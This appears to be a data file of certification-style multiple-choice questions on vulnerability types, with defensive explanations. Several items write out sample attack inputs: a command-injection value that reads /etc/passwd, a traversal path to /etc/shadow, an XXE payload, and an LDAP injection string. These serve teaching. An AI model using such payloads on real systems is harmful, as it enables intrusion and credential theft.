# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.3 - Vulnerability Types
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

User accounts across an organization have been granted Domain Admin privileges "just in case they need them." What misconfiguration vulnerability does this represent?|Default credentials|Unpatched software|Excessive privileges|Open ports|2|Granting excessive privileges to user accounts can lead to unauthorized access and privilege abuse. This violates the principle of least privilege, which states users should have only the minimum permissions necessary to perform their job functions. Excessive privileges are dangerous because: compromised regular accounts become highly valuable to attackers, insider threats have greater capacity for damage, accidental misuse can cause significant harm, and privilege creep accumulates over time as permissions are added but never removed. Common excessive privilege scenarios include: all users having administrative rights, service accounts with domain admin privileges, developers having production database access, contractors retaining access after project completion, and shared accounts with broad permissions. The impact includes: lateral movement (attackers pivoting between systems), data exfiltration (accessing sensitive information beyond job needs), destructive actions (deleting or encrypting data), and persistence (creating backdoor accounts with high privileges). Defense requires: regular access reviews and recertification, role-based access control (RBAC) with defined roles, just-in-time (JIT) privileged access, privileged access management (PAM) solutions, and monitoring for privilege escalation attempts.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A user jailbreaks their company iPhone to install unauthorized apps, bypassing Apple's security restrictions. What mobile device vulnerability does this create?|Sideloading|Rooting|Jailbreaking|End-of-life system|2|Jailbreaking applies specifically to Apple devices and allows users to bypass manufacturer or operating system restrictions, providing more control over the device. This is commonly known as unlocking a device. This freedom, however, exposes the device to significant security risks including: counterfeit apps (unregulated stores can host third-party counterfeit or modified versions of legitimate apps that carry hidden malware), software instability (unauthorized software modifications can destabilize the device's operating system, leading to crashes and erratic behavior), and security compromises (jailbreaking undermines device security measures, making it easier for malware and viruses to exploit vulnerabilities). Jailbroken devices bypass: sandboxing that isolates apps, code signing requirements that verify app authenticity, operating system security updates, and enterprise mobile device management (MDM). Organizations typically prohibit jailbroken devices from accessing corporate resources because they cannot be trusted to maintain security posture. Detection requires MDM solutions that check device integrity.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An Android user enables "Unknown Sources" and installs applications directly from APK files downloaded from third-party websites rather than Google Play Store. What mobile vulnerability is this?|Jailbreaking|Rooting|Sideloading|End-of-life|2|Sideloading is generally associated with Android devices utilizing Android Application Package (APK) files. While applications can also be sideloaded on Apple devices, the practice directly violates Apple's terms and conditions and voids the device's warranty. Voiding a device's warranty eliminates official support from the manufacturer, meaning the device may no longer receive security patches, bug fixes, or updates, leaving it vulnerable to new threats and exploits. Sideloading risks include: malware distribution (malicious apps masquerading as legitimate software), no app vetting (bypassing Google Play Protect scanning), trojanized apps (modified versions of legitimate apps with added malware), data theft (apps requesting excessive permissions), and ransomware distribution. While sideloading has legitimate uses (enterprise app distribution, beta testing, regional availability), it significantly increases risk when downloading from untrusted sources. Defense requires: mobile device management (MDM) preventing sideloading, user education about app store security, and application whitelisting for corporate devices.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A user gains root access on their Android device to remove carrier bloatware and install custom ROMs. What mobile device vulnerability does this create?|Jailbreaking|Rooting|Sideloading|Firmware vulnerability|1|Rooting allows users to bypass manufacturer or operating system restrictions on Android devices, providing more control over a device. This is commonly known as unlocking a device. This freedom, however, exposes the device to significant security risks. Rooted devices are susceptible to: counterfeit apps (unregulated stores can host third-party counterfeit or modified versions of legitimate apps carrying hidden malware), software instability (unauthorized software modifications can destabilize the operating system, leading to crashes and erratic behavior), and security compromises (rooting undermines device security measures, making it easier for malware and viruses to exploit vulnerabilities). Rooting provides superuser access, which: bypasses Android's permission system, disables security features like verified boot, prevents banking and payment apps from running (they detect root), and voids manufacturer warranty. While rooting has legitimate uses (custom ROMs, advanced features, removing bloatware), it fundamentally compromises the security model. Corporate policies typically prohibit rooted devices from accessing company resources.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A penetration tester discovers that a web application's file upload feature allows uploading PHP files, which are then executed by the server. What vulnerability class does this represent?|SQL injection|File upload vulnerability|Cross-site scripting|Buffer overflow|1|File upload vulnerabilities occur when web applications allow users to upload files without proper validation, sanitization, or restrictions. Attackers can exploit this to: upload and execute malicious code (PHP, JSP, ASP files), upload web shells for remote access, upload malware to distribute to other users, bypass authentication by uploading configuration files, and perform path traversal attacks by manipulating filenames. The example describes remote code execution through PHP upload, where the attacker uploads a PHP script that the web server executes, providing complete server control. Variations include: unrestricted file types (no extension validation), inadequate MIME type checking (only checking Content-Type header), filename manipulation (../../../etc/passwd), double extensions (malicious.php.jpg), and case sensitivity bypasses (file.PhP). Defense requires: validating file extensions against an allow list, verifying file content matches extension (magic bytes), storing uploaded files outside web root with no-execute permissions, renaming uploaded files to prevent direct execution, implementing file size limits, and scanning uploads with antimalware.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application uses the system() function to process user input: system("ping " + user_input). An attacker enters: 8.8.8.8; cat /etc/passwd. What vulnerability is this?|SQL injection|Command injection|LDAP injection|XML injection|1|Command injection (also called OS command injection) occurs when an application passes unsafe user-supplied data to a system shell. Attackers can execute arbitrary operating system commands on the server, potentially leading to complete system compromise. The attack works by: injecting shell metacharacters (semicolon, pipe, ampersand, double-ampersand, double-pipe) that chain commands, using command substitution ($(...) or `...`), redirecting output (> <), or piping data between commands. In the example, the semicolon terminates the ping command and executes cat /etc/passwd, exposing user accounts. Successful command injection allows: reading sensitive files, modifying system configuration, installing backdoors, pivoting to other systems, data exfiltration, and denial of service. Prevention requires: avoiding system shell invocation when possible, using safe APIs that don't invoke shells, validating input against strict allow lists, escaping shell metacharacters, and running with least privileges. Languages provide safer alternatives: subprocess with shell=False (Python), exec() over system() (PHP), and parameterized execution methods.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A web application allows users to navigate to files using: /viewfile?name=../../../../etc/shadow. What vulnerability allows an attacker to access files outside the intended directory?|SQL injection|Cross-site scripting|Directory traversal|Command injection|2|Directory traversal (also called path traversal or dot-dot-slash) is a vulnerability that allows attackers to access files and directories outside the web application's root directory. By manipulating variables that reference files with "dot-dot-slash (../)" sequences, attackers can traverse the file system. The attack works by: using ../ sequences to navigate up directory levels, accessing sensitive files (/etc/passwd, /etc/shadow, web.config, database.yml), reading application source code, accessing log files with sensitive information, and reading configuration files with credentials. Variations include: encoded traversal (%2e%2e%2f), double encoding (%252e%252e%252f), Unicode encoding, absolute paths (/etc/passwd), and combining with null bytes (file.txt%00.jpg). Impact includes: exposure of sensitive information, credential theft, source code disclosure, and potential for further exploitation using discovered information. Prevention requires: validating user input against allow lists, using canonicalization to resolve symbolic links and relative paths, implementing chroot jails, and using language-specific safe file access APIs.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A web application processes user-supplied XML data without validation. An attacker submits: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>. What vulnerability is this?|SQL injection|XXE (XML External Entity) injection|Command injection|LDAP injection|1|XML External Entity (XXE) injection is a vulnerability that occurs when an application parses XML input containing a reference to an external entity. Attackers can exploit XXE to: read arbitrary files from the server, perform Server-Side Request Forgery (SSRF) attacks, execute denial-of-service attacks, and potentially achieve remote code execution. The attack leverages XML's ability to define external entities that reference external resources (files, URLs). When the XML parser processes the entity, it retrieves and includes the referenced content. In the example, &xxe; references file:///etc/passwd, causing the parser to read and return the file contents. XXE can also: access internal services (http://localhost:8080/admin), exfiltrate data to attacker-controlled servers, perform port scanning, and exploit backend systems. XXE is particularly dangerous in: SOAP web services, SAML authentication, SVG file processing, and RSS feeds. Prevention requires: disabling external entity processing in XML parsers, using simpler data formats (JSON), validating XML against schemas, and using less complex XML parsers.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application with integer overflow vulnerability adds two large positive integers, resulting in a negative value that bypasses security checks. What type of vulnerability is this?|Buffer overflow|Integer overflow|Memory injection|Race condition|1|Integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits. When integers exceed their maximum value, they "wrap around" to their minimum value (or vice versa), producing unexpected results. Integer overflows are dangerous because: they can bypass security checks (negative values where positive expected), cause buffer overflows (size calculations wrap to small values), lead to memory corruption, and enable privilege escalation. Common scenarios include: adding two large numbers causing overflow, multiplying values for size calculations, subtracting resulting in underflow, and type conversions losing data. Real-world example: The Boeing 787 Dreamliner required rebooting every 248 days to prevent integer overflow in its electrical generation system. Prevention requires: using larger integer types when possible, validating input ranges before arithmetic, checking for overflow after operations, using languages with overflow detection, and using safe arithmetic libraries. Modern compilers can detect some integer overflow conditions, but explicit checking is still necessary for security-critical code.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application allocates memory dynamically but fails to release it after use, causing the program to consume increasing amounts of memory until system resources are exhausted. What vulnerability is this?|Buffer overflow|Memory leak|Integer overflow|Memory injection|1|Memory leak vulnerabilities occur when an application allocates memory for use but fails to release it when no longer needed. Over time, the accumulated leaked memory can exhaust system resources, leading to: performance degradation (application slows as memory fills), system crashes (out-of-memory conditions), denial of service (forcing system reboots), and potential security exploitation (attackers triggering leaks deliberately). Memory leaks occur due to: lost pointers (references to allocated memory are overwritten), circular references (objects referencing each other preventing garbage collection), improper resource cleanup (failing to close file handles, database connections), exception handling without cleanup, and manual memory management errors in C/C++. While garbage-collected languages (Java, C#, Python) mitigate some risks, leaks can still occur through: JNI native code, caching without eviction, event listeners not removed, and large object retention. Detection requires: memory profiling tools, monitoring memory usage over time, and analyzing heap dumps. Prevention requires: using RAII (Resource Acquisition Is Initialization) in C++, try-finally or using blocks for cleanup, weak references for caches, and automated leak detection in CI/CD.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An LDAP query is constructed using unsanitized user input: (&(uid=user_input)(password=pass)). An attacker enters: *)(uid=*))(OR(uid=*. What injection vulnerability is this?|SQL injection|XML injection|LDAP injection|Command injection|2|LDAP (Lightweight Directory Access Protocol) injection is a vulnerability that occurs when an application constructs LDAP statements using unsanitized user input. Attackers can modify LDAP queries to: bypass authentication, access unauthorized information, enumerate directory contents, and modify directory entries. LDAP injection exploits special characters in LDAP query syntax: * (wildcard), ( ) (grouping), ampersand and pipe (logical operators), and \ (escape). In the example, the attacker's input breaks the query structure and injects logic to always return true, bypassing authentication. LDAP injection attacks can: bypass login by injecting always-true conditions, enumerate users by injecting wildcards, access sensitive attributes, and perform privilege escalation. LDAP is commonly used in: Active Directory authentication, enterprise address books, organizational hierarchies, and access control systems. Prevention requires: input validation against allow lists, escaping LDAP special characters, using parameterized queries if available, implementing least privilege for LDAP accounts, and monitoring for LDAP injection patterns. Unlike SQL injection which is widely known, LDAP injection is often overlooked despite similar risks.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A zero-day vulnerability in widely-used software is being actively exploited before the vendor releases a patch. What makes this vulnerability particularly dangerous?|It targets end-of-life systems|No patch or mitigation is available yet|It exploits default credentials|It requires physical access|1|Zero-day vulnerabilities are those unknown to the vendor with no available patch. They represent an especially dangerous threat vector because: no patch or update is available to fix the vulnerability, attackers have a window of opportunity before defenses can be implemented, traditional signature-based security tools cannot detect exploitation of unknown vulnerabilities, and the organization must rely on compensating controls while a patch is developed. Zero-days are valuable: nation-state actors stockpile them for espionage/warfare, criminal groups sell them for high prices ($1M+ for iOS zero-days), and advanced persistent threats (APTs) use them for targeted attacks. Organizations facing zero-day threats must: implement defense-in-depth strategies so no single vulnerability compromises the entire system, use behavioral analysis and anomaly detection to identify exploitation attempts, deploy virtual patching through WAFs or IPSs, isolate affected systems if possible, work with vendors to develop emergency patches, and monitor threat intelligence for indicators of compromise. Recent examples: Log4Shell (CVE-2021-44228), ProxyLogon Exchange vulnerabilities, and Eternal Blue (used by WannaCry).|Threats, Vulnerabilities, and Mitigations|Vulnerabilities
